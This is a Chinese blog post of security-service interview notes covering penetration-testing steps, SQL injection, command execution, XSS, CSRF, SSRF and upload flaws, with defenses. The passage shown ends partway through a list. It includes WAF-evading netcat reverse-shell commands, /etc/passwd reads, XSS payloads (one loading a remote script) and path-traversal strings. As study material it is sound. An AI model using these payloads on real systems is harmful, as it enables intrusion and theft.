@@ -1,0 +1,1491 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="QrYuOcgHntsSXYVGvWVZS98NACE7wP7Rx3KVbK2_F1s">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-128x128-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Interview,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离沫凌天๓" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="渗透测试基本流程1.信息收集  服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试">
+<meta name="keywords" content="Interview">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安服问题">
+<meta property="og:url" content="https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html">
+<meta property="og:site_name" content="离沫凌天๓">
+<meta property="og:description" content="渗透测试基本流程1.信息收集  服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-08-20T09:27:14.514Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安服问题">
+<meta name="twitter:description" content="渗透测试基本流程1.信息收集  服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html">
+
+
+
+
+
+  <title>安服问题 | 离沫凌天๓</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离沫凌天๓</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">花开花落 一路上起起跌跌</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离沫凌天๓">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离沫凌天๓">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">安服问题</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-30T19:09:05+08:00">
+                2020-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index">
+                    <span itemprop="name">Note</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="渗透测试基本流程"><a href="#渗透测试基本流程" class="headerlink" title="渗透测试基本流程"></a>渗透测试基本流程</h2><p>1.信息收集</p>
+<ul>
+<li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li>
+<li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li>
+<li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li>
+<li>子域名收集，旁站查询(有授权可渗透)，C段等</li>
+<li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li>
+<li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li>
+<li>传输协议，通用漏洞，exp，github源码等</li>
+</ul>
+<p>2.漏洞挖掘</p>
+<p>   XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，使用漏扫工具等</p>
+<p>3.漏洞利用|提权</p>
+<p>   mysql提权，linux系统提权</p>
+<p>4.编写报告|清除测试数据</p>
+<p>5.漏洞复测</p>
+<h2 id="sqlmap的运行机理"><a href="#sqlmap的运行机理" class="headerlink" title="sqlmap的运行机理"></a>sqlmap的运行机理</h2><ol>
+<li><p>尝试连接目标网站</p>
+</li>
+<li><p>确认目标网站是否为动态网页</p>
+</li>
+<li><p>通过报错确认数据库的类型</p>
+</li>
+<li><p>添加payload进行测试</p>
+</li>
+<li><p>测试出注入类型后会对数据库版本进行猜测</p>
+</li>
+<li><p>最后的出结论</p>
+</li>
+</ol>
+<h2 id="htaccess利用"><a href="#htaccess利用" class="headerlink" title=".htaccess利用"></a>.htaccess利用</h2><ul>
+<li><p>htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。</p>
+</li>
+<li><p>.htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。</p>
+</li>
+</ul>
+<ol>
+<li>用连续的弹出图片骚扰用户</li>
+<li>可以上传图片马，将jpg文件解析为php文件</li>
+</ol>
+<h2 id="sql注入原理及防御"><a href="#sql注入原理及防御" class="headerlink" title="sql注入原理及防御"></a>sql注入原理及防御</h2><p>原理 ： 当网站在向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么恶意访问者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+<p>防御：</p>
+<ol>
+<li><p>关闭错误提示，php.ini中的display_errors=Off</p>
+</li>
+<li><p>魔术引号当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（/）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。</p>
+</li>
+<li><p>通过使用参数化查询和对象关系映射(Object Relational Mappers，ORM)，来避免和修复注入漏洞。此类查询通过指定参数的占位符，以便数据库始终将它们视为数据，而非SQL命令的一部分。</p>
+</li>
+<li><p>使用转义字符</p>
+</li>
+</ol>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>命令执行漏洞原理：<br>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p>
+<p>命令执行漏洞利用条件：</p>
+<ul>
+<li>应用调用执行系统命令的函数</li>
+<li>将用户输入作为系统命令的参数拼接到了命令行中</li>
+<li><p>没有对用户输入进行过滤或过滤不严<br>漏洞分类：</p>
+</li>
+<li><p>代码层过滤不严</p>
+<ul>
+<li>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(“/bin/program –arg $arg”);</li>
+</ul>
+</li>
+<li><p>系统的漏洞造成命令注入</p>
+<ul>
+<li>bash破壳漏洞（CVE-2014-6271）</li>
+</ul>
+</li>
+<li><p>调用的第三方组件存在代码执行漏洞</p>
+<ul>
+<li>如wordPress中用来处理图片的imageMagick组件<br>JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）<br>ThinkPHP命令执行</li>
+</ul>
+</li>
+</ul>
+<p>漏洞危害：</p>
+<ul>
+<li>继承Web服务程序的权限去执行系统命令或读写文件</li>
+<li>反弹shell</li>
+<li>控制整个网站甚至服务器</li>
+<li>进一步内网渗透</li>
+</ul>
+<p>命令拼接符<br>|、||、&amp;、&amp;&amp;的区别：<br>&amp;：无论左边是false还是true，右边都执行<br>&amp;&amp;：具有短路效果，左边是false，右边不执行。<br>|:无论左边是false还是true，右边都会执行<br>||：具有短路效果，左边是true，右边不执行。</p>
+<p>代码执行：</p>
+<ul>
+<li><p>利用系统函数实现命令执行，在php下，允许命令执行的函数有：<br>eval（）、assert（）、preg_replace（）、call_user_func（）<br>如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞</p>
+</li>
+<li><p>其他函数<br>ob_start（）、unserialize（）、creat_function（）<br>、usort（）、uasort（）、uksort（）、<br>array_filter（）、<br>array_reduce（）、<br>array_map（）……</p>
+</li>
+</ul>
+<p>系统命令执行漏洞</p>
+<ul>
+<li>system（）</li>
+<li>exec（）</li>
+<li>shell_exec（）</li>
+<li>passthru（）</li>
+<li>pcntl_exec（）</li>
+<li>popen（）</li>
+<li>proc_open（）</li>
+<li>反引号<br>……</li>
+</ul>
+<p>命令执行WAF绕过技巧</p>
+<ul>
+<li>技巧一：通配符<br>ls-l<br>使用通配符<br>/?in/?s-l</li>
+</ul>
+<p>/???/??t /??c/p???w?<br>有时候WAF不允许使用太多的？号<br>/?in/cat/?tc/p?sswd</p>
+<ul>
+<li>NC反弹shell:<br>nc -e /bin/bash 127.0.0.1 3737<br>为了避免符号，可以将IP地址转换成整型。<br>127.0.0.1-&gt;2130706433</li>
+</ul>
+<p>使用通配符<br>root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737</p>
+<p>技巧二：连接符</p>
+<p>技巧三：未初始化的bash变量<br>在bash环境中允许我们使用未初始化的bash变量，如何<br>$a ,$b,$c<br>我们事先并没有定义它们，输出看看:<br>root@kali:~# echo $a<br>root@kali:~# echo $b<br>root@kali:~# echo $c<br>root@kali:~#<br>未初始化的变量值都是null</p>
+<p>读取/etc/passwd:<br>cat$a /etc$a/passwd$a</p>
+<p>测试WAF<br>测试代码：<br>&lt;?php<br>echo “OK”;<br>system(‘dig’.$_GET[‘host’]);<br>?&gt;</p>
+<p><a href="http://www.baidu.com;$s/bin$s/which$s" target="_blank" rel="noopener">www.baidu.com;$s/bin$s/which$s</a> nc$s<br>反弹shell:<br>/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737</p>
+<p>漏洞修复：</p>
+<ul>
+<li>尽量少用执行命令的函数或者直接禁用</li>
+<li>参数值尽量使用引号包括</li>
+<li>在使用动态函数之前，确保使用的函数是指定的函数之一</li>
+<li>在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</li>
+<li>对PHP语言来说，不能完全控制的危险函数最好不要使用</li>
+</ul>
+<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>​    恶意攻击者往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。</p>
+<ul>
+<li><p>反射型XSS：攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
+</li>
+<li><p>存储型XSS：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。</p>
+</li>
+<li><p>DOM性XSS：DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p>
+</li>
+</ul>
+<p>防御：</p>
+<ul>
+<li>进行输入检查，限制输入允许的字符，让特殊字符的攻击失效。XSS Filter</li>
+<li>开启HttpOnly，解决xss后的cookie劫持问题</li>
+<li>进行输出过滤，所有需要输出到页面的元素全部通过HTMLEncode</li>
+</ul>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p>
+<p>防御：</p>
+<ol>
+<li><p>同源检测  禁止不受信任的域名对我们发起请求。</p>
+<p>Origin Header</p>
+<p>Referer Header</p>
+</li>
+<li><p>CSRF Token</p>
+<p>a. 将CSRF Token输出到页面中</p>
+<p>b. 页面提交的请求携带这个Token</p>
+<p>c. 服务器验证Token是否正确</p>
+</li>
+<li><p>双重cookie验证</p>
+<p>在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如<code>csrfcookie=v8g9e4ksfhw</code>）。</p>
+<p>在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例<code>POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw</code>）。</p>
+<p>后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。</p>
+<p>任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间）</p>
+</li>
+<li><p>Samesite Cookie 属性</p>
+</li>
+</ol>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>通常用于控制web进而探测内网服务以及拥挤内网脆弱应用</p>
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p>
+<p>利用：</p>
+<ul>
+<li><p>file协议查看文件</p>
+</li>
+<li><p>dict协议探测端口</p>
+</li>
+<li><p>gopher协力支持get&amp;post请求</p>
+</li>
+</ul>
+<p>防御：</p>
+<ul>
+<li><p>限制协议为HTTP，HTTPS</p>
+</li>
+<li><p>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
+</li>
+<li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+</li>
+<li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+</li>
+</ul>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p>
+<p>造成文件上传漏洞的原因有：</p>
+<ul>
+<li>开源编辑器的上传漏洞</li>
+<li>服务器配置不当</li>
+<li>本地文件上传限制被绕过</li>
+<li>过滤不严或被绕过</li>
+<li>文件解析漏洞导致文件执行</li>
+<li>文件路径截断</li>
+</ul>
+<p>绕过：</p>
+<ul>
+<li><p>%00 截断绕过</p>
+</li>
+<li><p>文件名绕过 大小写绕过  php2 php3 php5 phtml</p>
+</li>
+<li><p>Content-Type绕过</p>
+</li>
+<li><p>前端js绕过</p>
+<ol>
+<li><code>Content-Type绕过</code></li>
+<li><code>前端绕过</code></li>
+<li><code>文件解析规则绕过</code></li>
+<li><code>Windows环境特性绕过</code></li>
+<li><code>文件名大小写绕过</code></li>
+<li><code>双写绕过</code></li>
+<li><code>点空格绕过</code></li>
+<li><code>文件头绕过</code></li>
+<li><code>条件竞争绕过</code></li>
+</ol>
+</li>
+</ul>
+<p>防御</p>
+<ol>
+<li>将文件上传的目录设置为不可执行</li>
+<li>判断文件类型，结合使用MIME Type，后最检查等方式，推荐使用白名单方式</li>
+<li>使用随机数改写文件名和文件路径。</li>
+</ol>
+<h3 id="常用web漏洞测试的payload整理"><a href="#常用web漏洞测试的payload整理" class="headerlink" title="常用web漏洞测试的payload整理"></a><strong>常用web漏洞测试的payload整理</strong></h3><p>[反射型xss]</p>
+<ul>
+<li>[在html形成]</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&apos;&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;svg οnlοad=document.title=&quot;[random]&quot;;&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>[在js形成]</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.title=&quot;[random]&quot;;//</span><br><span class="line">;document.title=&quot;[random]&quot;;//</span><br><span class="line">&quot;;document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;;document.title=&quot;[random]&quot;;</span><br><span class="line">&quot;);document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;);document.title=&quot;[random]&quot;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>[在html属性形成(img)]</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">888&quot; οnlοad=document.title=&quot;[random]&quot; a=&quot;</span><br><span class="line">888&apos; οnlοad=document.title=&quot;[random]&quot; a=&apos;</span><br><span class="line">888 οnlοad=document.title=&quot;[random]&quot;</span><br></pre></td></tr></table></figure>
+<p>[存储型xss]</p>
+<ul>
+<li>[通用payload]<br>测试环境，需要在触发的地方查看payload显示情况</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/StoredXssByScriptTag/);&lt;/script&gt;</span><br><span class="line">&quot;&apos;&gt;&lt;script&gt;alert(/StoredXssByScriptTagBypass);&lt;/script&gt;</span><br><span class="line">[Bypass on Event] [事件型绕过]</span><br><span class="line"></span><br><span class="line">&lt;img src=1 οnerrοr=alert(/StoredXssByImgTag/)&gt;  #一般富文本不会过滤img标签</span><br><span class="line">[Bypass pseudo protocol] [伪协议绕过]</span><br><span class="line"></span><br><span class="line">&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;</span><br><span class="line">[Bypass html5 tag] [html5标签绕过]</span><br><span class="line"></span><br><span class="line">&lt;svg οnlοad=prompt(/StoredXssBySvgTag/)&gt;</span><br><span class="line">&lt;embed src=javascript:alert(/StoredXssByEmbedTag/);&gt;</span><br><span class="line">[Bypass html or js encode] [js编码，html编码，十进制编码绕过等]</span><br><span class="line"></span><br><span class="line">&lt;embed src=javas&amp;#99;r&amp;#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);&gt;</span><br><span class="line">&lt;video&gt;&lt;source οnerrοr=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))&gt;</span><br><span class="line">&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)&gt;&lt;/script&gt;</span><br><span class="line">如果进行盲测可以根据xss平台地址替换相应的js触发代码</span><br><span class="line">&quot;&gt;&lt;script src=http://myxss.net/xxxxxx&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>[静态文件读取]</p>
+<ul>
+<li><p>[常规检测]</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd</span><br><span class="line">/../../../../../../../../../../../etc/hosts</span><br><span class="line">/../../../../../../../C:/Windows/system.ini [windows]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>[伪造绕过]</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/././././././././././././././././././././././././../../../../../../etc/passwd</span><br><span class="line">/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span><br><span class="line">/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd</span><br><span class="line">/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>[后缀绕过]</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd#</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.html</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.html</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html</span><br><span 